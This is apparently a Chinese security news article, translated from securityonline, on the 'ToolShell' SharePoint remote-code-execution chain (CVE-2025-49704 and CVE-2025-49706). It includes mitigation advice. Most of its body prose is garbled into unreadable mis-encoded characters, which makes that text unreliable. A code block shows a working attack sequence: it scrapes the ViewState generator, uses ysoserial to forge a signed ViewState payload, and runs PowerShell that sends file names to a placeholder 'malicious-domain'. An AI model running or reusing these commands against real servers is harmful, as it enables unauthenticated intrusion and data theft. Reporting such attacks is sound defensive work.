---
title: ToolShell漏洞：全球范围内出现新型SharePoint远程代码执行零日漏洞攻击链
url: https://www.anquanke.com/post/id/310365
source: 安全客-有思想的安全新媒体
date: 2025-07-22
fetch_date: 2025-10-06T23:16:56.538363
---

# ToolShell漏洞：全球范围内出现新型SharePoint远程代码执行零日漏洞攻击链

йҰ–йЎө

йҳ…иҜ»

* [е®үе…Ёиө„и®Ҝ](https://www.anquanke.com/news)
* [е®үе…ЁзҹҘиҜҶ](https://www.anquanke.com/knowledge)
* [е®үе…Ёе·Ҙе…·](https://www.anquanke.com/tool)

жҙ»еҠЁ

зӨҫеҢә

еӯҰйҷў

е®үе…ЁеҜјиҲӘ

еҶ…е®№зІҫйҖү

* [дё“ж Ҹ](/column/index.html)
* [зІҫйҖүдё“йўҳ](https://www.anquanke.com/subject-list)
* [е®үе…ЁKERеӯЈеҲҠ](https://www.anquanke.com/discovery)
* [360зҪ‘з»ңе®үе…Ёе‘ЁжҠҘ](https://www.anquanke.com/week-list)

# ToolShellжјҸжҙһпјҡе…ЁзҗғиҢғеӣҙеҶ…еҮәзҺ°ж–°еһӢSharePointиҝңзЁӢд»Јз Ғжү§иЎҢйӣ¶ж—ҘжјҸжҙһж”»еҮ»й“ҫ

йҳ…иҜ»йҮҸ**82183**

еҸ‘еёғж—¶й—ҙ : 2025-07-21 17:24:01

**x**

##### иҜ‘ж–ҮеЈ°жҳҺ

жң¬ж–ҮжҳҜзҝ»иҜ‘ж–Үз« пјҢж–Үз« еҺҹдҪңиҖ… DdosпјҢж–Үз« жқҘжәҗпјҡsecurityonline

еҺҹж–Үең°еқҖпјҡ<https://securityonline.info/toolshell-new-sharepoint-rce-zero-day-chain-under-active-global-exploitation/>

иҜ‘ж–Үд»…дҫӣеҸӮиҖғпјҢе…·дҪ“еҶ…е®№иЎЁиҫҫд»ҘеҸҠеҗ«д№үеҺҹж–ҮдёәеҮҶгҖӮ

![]()

*еӣҫзүҮжқҘжәҗпјҡеҫ·еӣҪ Code White е…¬еҸё*

2025е№ҙ7жңҲ18ж—ҘжҷҡпјҢзҪ‘з»ңе®үе…Ёжңәжһ„Eye SecurityеҸ‘зҺ°дёҖиө·**й’ҲеҜ№еҫ®иҪҜSharePointиҝңзЁӢд»Јз Ғжү§иЎҢпјҲRCEпјүжјҸжҙһй“ҫ**зҡ„еӨ§и§„жЁЎж”»еҮ»жҙ»еҠЁпјҢиҜҘжјҸжҙһй“ҫиў«е‘ҪеҗҚдёә**вҖңToolShellвҖқ**гҖӮж”»еҮ»иҖ…еҲ©з”Ё**CVE-2025-49704**е’Ң**CVE-2025-49706**дёӨдёӘжјҸжҙһпјҢ**ж— йңҖи®ӨиҜҒеҚіеҸҜе®Ңе…ЁжҺ§еҲ¶жң¬ең°йғЁзҪІзҡ„SharePointжңҚеҠЎеҷЁ**пјҢе…ЁзҗғеӨҡеӣҪзі»з»ҹе·ІеҸ—еҲ°еҪұе“ҚгҖӮ

Eye Securityејәи°ғпјҡвҖңжӯӨж¬Ўж”»еҮ»е№¶йқһеҮӯиҜҒжі„йңІй—®йўҳпјҢиҖҢжҳҜж”»еҮ»иҖ…зӣҙжҺҘеҲ©з”ЁдәҶе·Іиў«жӯҰеҷЁеҢ–зҡ„Pwn2OwnжјҸжҙһеҲ©з”ЁзЁӢеәҸгҖӮвҖқ

ToolShellжјҸжҙһй“ҫеҲҶдёә**дёӨдёӘж”»еҮ»жӯҘйӘӨ**пјҡ

**В  1. CVE-2025-49706пјҲCVSSиҜ„еҲҶ6.3пјү**пјҡSharePointжңҚеҠЎеҷЁж¬әйӘ—жјҸжҙһ

**В  2. CVE-2025-49704пјҲCVSSиҜ„еҲҶ8.8пјү**пјҡйҖҡиҝҮToolPaneз«ҜзӮ№и§ҰеҸ‘зҡ„SharePointиҝңзЁӢд»Јз Ғжү§иЎҢжјҸжҙһ

жңҖеҲқз ”з©¶дәәе‘ҳи®Өдёәж”»еҮ»йңҖжңүж•ҲеҮӯиҜҒпјҢдҪҶж·ұе…Ҙи°ғжҹҘеҸ‘зҺ°пјҢж”»еҮ»иҖ…**е®Ңе…Ёз»•иҝҮи®ӨиҜҒжңәеҲ¶**гҖӮжҠҘе‘ҠжҢҮеҮәпјҡвҖңеҗ‘/\_layouts/15/ToolPane.aspxеҸ‘йҖҒPOSTиҜ·жұӮзҡ„иЎҢдёәе…·жңүй«ҳеәҰй’ҲеҜ№жҖ§вҖҰвҖҰжҲ‘д»¬ж„ҸиҜҶеҲ°еҮӯиҜҒеҸҜиғҪд»ҺжңӘиў«дҪҝз”ЁгҖӮвҖқ

иҜҘжјҸжҙһеҲ©з”ЁеҹәдәҺCode White GmbHжӣҫеңЁPwn2OwnжҜ”иөӣдёӯжј”зӨәзҡ„жҰӮеҝөйӘҢиҜҒд»Јз ҒпјҢзҺ°е·Іиў«жӯҰеҷЁеҢ–гҖӮж”»еҮ»жҲҗеҠҹеҗҺпјҢж”»еҮ»иҖ…**еҸҜжӨҚе…Ҙйҡҗи”Ҫзҡ„ASPXжҒ¶ж„Ҹж–Үд»¶**пјҲеҰӮspinstall0.aspxпјүпјҢе…¶и®ҫи®Ўзӣ®зҡ„е№¶йқһзӣҙжҺҘжү§иЎҢе‘Ҫд»ӨпјҢиҖҢжҳҜ**зӘғеҸ–жңҚеҠЎеҷЁзҡ„еҠ еҜҶжңәеҷЁеҜҶй’Ҙ**гҖӮ

вҖңиҝҷдёҚжҳҜе…ёеһӢзҡ„зҪ‘йЎөжңЁй©¬вҖҰвҖҰиҜҘж–Үд»¶йҖҡиҝҮ**и°ғз”Ё.NETеҶ…йғЁж–№жі•**иҜ»еҸ–**SharePointжңҚеҠЎеҷЁ**зҡ„**MachineKeyй…ҚзҪ®**гҖӮвҖқиҝҷдәӣеҜҶй’ҘпјҲеҰӮValidationKeyе’ҢDecryptionKeyпјүз”ЁдәҺз”ҹжҲҗжңүж•Ҳзҡ„**\_\_VIEWSTATEд»ӨзүҢ**вҖ”вҖ”иҝҷжҳҜASP.NETзҡ„ж ёеҝғе®үе…ЁжңәеҲ¶гҖӮиҺ·еҸ–еҜҶй’ҘеҗҺпјҢж”»еҮ»иҖ…иғҪдҪҝз”Ёysoserialзӯүе·Ҙе…·зӯҫзҪІжҒ¶ж„ҸиҪҪиҚ·пјҢе®һзҺ°е®Ңе…ЁиҝңзЁӢд»Јз Ғжү§иЎҢгҖӮ

```
# grabbing the <VIEWSTATE_GENERATOR> via any public available SharePoint page, like start.aspx
curl -s https://target/_layouts/15/start.aspx | grep -oP '__VIEWSTATEGENERATOR" value="\K[^"]+'
# example viewstate payload that can be generated
ysoserial.exe -p ViewState -g TypeConfuseDelegate \
-c "powershell -nop -c \"dir 'C:\Program Files\Common Files\Microsoft Shared\Web Server Extensions\TEMPLATE\LAYOUTS' | % { Invoke-WebRequest -Uri ('http://malicious-domain/?f=' + [uri]::EscapeDataString($_.Name)) }\"" \
--generator="<VIEWSTATE_GENERATOR>" \
--validationkey="<VALIDATION_KEY>" \
--validationalg="<VALIDATION_ALG>" \
--islegacy \
--minify
# by adding the generated token to any request, your command is executed (RCE)
curl http://target/_layouts/15/success.aspx?__VIEWSTATE=<YSOSERIAL_GENERATED_PAYLOAD>
```

жҠҘе‘ҠжҢҮеҮәпјҡвҖңиҝҷдәӣиҪҪиҚ·**еҸҜеөҢе…Ҙд»»ж„ҸжҒ¶ж„ҸжҢҮд»Ө**пјҢе№¶иў«жңҚеҠЎеҷЁи§Ҷдёә**еҸҜдҝЎиҫ“е…Ҙ**пјҢжңҖз»ҲеңЁж— йңҖеҮӯиҜҒзҡ„жғ…еҶөдёӢе®ҢжҲҗж”»еҮ»й“ҫгҖӮвҖқ

Eye SecurityеҜ№8000дҪҷеҸ°е…¬ејҖжҡҙйңІзҡ„SharePointжңҚеҠЎеҷЁжү«жҸҸеҗҺеҸ‘зҺ°пјҢе·Іжңүж•°еҚҒеҸ°иў«е…ҘдҫөгҖӮйҖҡиҝҮеҲҶжһҗ160еӯ—иҠӮзҡ„зү№е®ҡе“Қеә”зү№еҫҒеҸҠspinstall0.aspxз«ҜзӮ№пјҢз ”з©¶дәәе‘ҳй”Ғе®ҡдәҶеҸ—еҪұе“Қзі»з»ҹгҖӮ

жҲӘиҮі7жңҲ19ж—ҘпјҢPalo Alto Networksж——дёӢUnit 42еӣўйҳҹиҜҒе®һж”»еҮ»д»ҚеңЁжҢҒз»ӯпјҢе№¶и§ӮеҜҹеҲ°ж”»еҮ»иҖ…пјҡ

**В  1. йҖҡиҝҮPowerShellжӨҚе…ҘжҒ¶ж„ҸASPXж–Үд»¶пјӣ**

**В  2. зӘғеҸ–жңәеҷЁеҜҶй’Ҙд»Ҙз»ҙжҢҒжҢҒд№…и®ҝй—®пјӣ**

**В  3. д»ҺеҸҜз–‘IPпјҲеҰӮ96[.]9[.]125[.]147пјүдёӢиҪҪжү§иЎҢжЁЎеқ—гҖӮ**

еҫ®иҪҜе·ІеҸ‘еёғзҙ§жҖҘиЎҘдёҒдҝ®еӨҚжјҸжҙһгҖӮй’ҲеҜ№жң¬ең°йғЁзҪІзҡ„SharePointжңҚеҠЎеҷЁпјҢе»әи®®з«ӢеҚійҮҮеҸ–д»ҘдёӢжҺӘж–Ҫпјҡ

В  1. е®үиЈ…7жңҲиЎҘдёҒжҳҹжңҹдәҢеҸ‘еёғзҡ„жңҖж–°зүҲжң¬пјӣ

В  2. жү«жҸҸ/\_layouts/15/ToolPane.aspxе’Ң/spinstall0.aspxзӯүи·Ҝеҫ„зҡ„е…Ҙдҫөз—•иҝ№пјӣ

В  3. жЈҖжҹҘеҜҶй’ҘжҳҜеҗҰжі„йңІпјҢеҝ…иҰҒж—¶йҮҚж–°з”ҹжҲҗпјӣ

В  4. зӣ‘жҺ§HTTP(S)еӨ–иҒ”иҝһжҺҘеҸҠеҸҚеҗ‘Shellжҙ»еҠЁгҖӮ

жң¬ж–Үзҝ»иҜ‘иҮӘsecurityonline [еҺҹж–Үй“ҫжҺҘ](https://securityonline.info/toolshell-new-sharepoint-rce-zero-day-chain-under-active-global-exploitation/)гҖӮеҰӮиӢҘиҪ¬иҪҪиҜ·жіЁжҳҺеҮәеӨ„гҖӮ

е•ҶеҠЎеҗҲдҪңпјҢж–Үз« еҸ‘еёғиҜ·иҒ”зі» anquanke@360.cn

жң¬ж–Үз”ұ**е®үе…Ёе®ў**еҺҹеҲӣеҸ‘еёғ

иҪ¬иҪҪпјҢиҜ·еҸӮиҖғ[иҪ¬иҪҪеЈ°жҳҺ](https://www.anquanke.com/note/repost)пјҢжіЁжҳҺеҮәеӨ„пјҡ [https://www.anquanke.com/post/id/310365](/post/id/310365)

е®үе…ЁKER - жңүжҖқжғізҡ„е®үе…Ёж–°еӘ’дҪ“

жң¬ж–ҮиҪ¬иҪҪиҮӘ: [securityonline](https://securityonline.info/toolshell-new-sharepoint-rce-zero-day-chain-under-active-global-exploitation/)

еҰӮиӢҘиҪ¬иҪҪ,иҜ·жіЁжҳҺеҮәеӨ„пјҡ <https://securityonline.info/toolshell-new-sharepoint-rce-zero-day-chain-under-active-global-exploitation/>

е®үе…ЁKER - жңүжҖқжғізҡ„е®үе…Ёж–°еӘ’дҪ“

еҲҶдә«еҲ°пјҡ![еҫ®дҝЎ](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

* [е®үе…Ёиө„и®Ҝ](/tag/%D0%B5%C2%AE%D2%AF%D0%B5%E2%80%A6%D0%81%D0%B8%D3%A9%E2%80%9E%D0%B8%C2%AE%D2%9C)
* [жјҸжҙһжғ…жҠҘ](/tag/%D0%B6%D1%98%D2%B8%D0%B6%D2%99%D2%BB%D0%B6%D2%93%E2%80%A6%D0%B6%D2%A0%D2%98)

**+1**5иөһ

ж”¶и—Ҹ

![](https://p2.ssl.qhimg.com/t010857340ce46bb672.jpg)е®үе…Ёе®ў

еҲҶдә«еҲ°пјҡ![еҫ®дҝЎ](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

## еҸ‘иЎЁиҜ„и®ә

жӮЁиҝҳжңӘзҷ»еҪ•пјҢиҜ·е…Ҳзҷ»еҪ•гҖӮ

[зҷ»еҪ•](/login/index.html)

![](https://p5.ssl.qhimg.com/t014757b72460d855bf.png)

[![](https://p2.ssl.qhimg.com/t010857340ce46bb672.jpg)](/member.html?memberId=171771)

[е®үе…Ёе®ў](/member.html?memberId=171771)

иҝҷдёӘдәәеӨӘжҮ’дәҶпјҢзӯҫеҗҚйғҪжҮ’еҫ—еҶҷдёҖдёӘ

* ж–Үз«
* **545**

* зІүдёқ
* **5**

### TAзҡ„ж–Үз«

* ##### [еӣҪеәҶйҮҚдҝқ+ж”»йҳІжј”з»ғеӨ§иҖғеңЁеҚіпјҒ360еӨ§жЁЎеһӢе®үе…ЁжңҚеҠЎдё“йЎ№ж–№жЎҲзӯ‘зүўAIйҳІзәҝ](/post/id/312460)

  2025-09-29 18:06:17
* ##### [Apache Airflow еӯҳеңЁжқғйҷҗжјҸжҙһпјҢеҸҜеҜјиҮҙеҸӘиҜ»з”ЁжҲ·иҺ·еҸ–ж•Ҹж„ҹдҝЎжҒҜ](/post/id/312457)

  2025-09-29 18:05:56
* ##### [Meta ж—ЁеңЁжү“йҖ жңәеҷЁдәәйўҶеҹҹзҡ„вҖңAndroidвҖқпјҢдёәдёӢдёҖд»ЈдәәеҪўAIжҸҗдҫӣйҖҡз”Ёе№іеҸ°](/post/id/312454)

  2025-09-29 18:05:34
* ##### [Formbricks еӯҳеңЁй«ҳеҚұжјҸжҙһ (CVE-2025-59934)пјҢж”»еҮ»иҖ…еҸҜйҖҡиҝҮдјӘйҖ JWTд»ӨзүҢеҜјиҮҙжңӘжҺҲжқғзҡ„еҜҶз ҒйҮҚзҪ®](/post/id/312451)

  2025-09-29 18:05:05
* ##### [Notepad++ дёӯеӯҳеңЁDLLеҠ«жҢҒжјҸжҙһпјҲCVE-2025-56383пјүпјҢеҸҜеҜјиҮҙд»»ж„Ҹд»Јз Ғжү§иЎҢпјҢдё”POCе·Іе…¬ејҖ](/post/id/312448)

  2025-09-29 18:04:33

### зӣёе…іж–Үз«

* ##### [еӣҪеәҶйҮҚдҝқ+ж”»йҳІжј”з»ғеӨ§иҖғеңЁеҚіпјҒ360еӨ§жЁЎеһӢе®үе…ЁжңҚеҠЎдё“йЎ№ж–№жЎҲзӯ‘зүўAIйҳІзәҝ](/post/id/312460)

  2025-09-29 18:06:17
* ##### [Apache Airflow еӯҳеңЁжқғйҷҗжјҸжҙһпјҢеҸҜеҜјиҮҙеҸӘиҜ»з”ЁжҲ·иҺ·еҸ–ж•Ҹж„ҹдҝЎжҒҜ](/post/id/312457)

  2025-09-29 18:05:56
* ##### [Meta ж—ЁеңЁжү“йҖ жңәеҷЁдәәйўҶеҹҹзҡ„вҖңAndroidвҖқпјҢдёәдёӢдёҖд»ЈдәәеҪўAIжҸҗдҫӣйҖҡз”Ёе№іеҸ°](/post/id/312454)

  2025-09-29 18:05:34
* ##### [Formbricks еӯҳеңЁй«ҳеҚұжјҸжҙһ (CVE-2025-59934)пјҢж”»еҮ»иҖ…еҸҜйҖҡиҝҮдјӘйҖ JWTд»ӨзүҢеҜјиҮҙжңӘжҺҲжқғзҡ„еҜҶз ҒйҮҚзҪ®](/post/id/312451)

  2025-09-29 18:05:05
* ##### [Notepad++ дёӯеӯҳеңЁDLLеҠ«жҢҒжјҸжҙһпјҲCVE-2025-56383пјүпјҢеҸҜеҜјиҮҙд»»ж„Ҹд»Јз Ғжү§иЎҢпјҢдё”POCе·Іе…¬ејҖ](/post/id/312448)

  2025-09-29 18:04:33
* ##### [Morteеғөе°ёзҪ‘з»ңиў«жҠ«йңІпјҡжӯЈеҲ©з”Ёи·Ҝз”ұеҷЁдёҺдјҒдёҡеә”з”ЁжјҸжҙһпјҢиҝ…йҖҹжү©еј е…¶вҖңеҠ иҪҪеҷЁеҚіжңҚеҠЎвҖқжҙ»еҠЁ](/post/id/312444)

  2025-09-29 18:04:01
* ##### [AkiraеӢ’зҙўиҪҜд»¶еҲ©з”ЁSonicWall VPNиҙҰжҲ·еҸ‘иө·жҖҘйҖҹе…Ҙдҫө](/post/id/312438)

  2025-09-29 18:03:28

### зғӯй—ЁжҺЁиҚҗ

ж–Үз« зӣ®еҪ•

![](https://p0.qhimg.com/t11098f6bcd5614af4bf21ef9b5.png)

е®үе…ЁKER

* [е…ідәҺжҲ‘д»¬](/about)
* [иҒ”зі»жҲ‘д»¬](/note/con...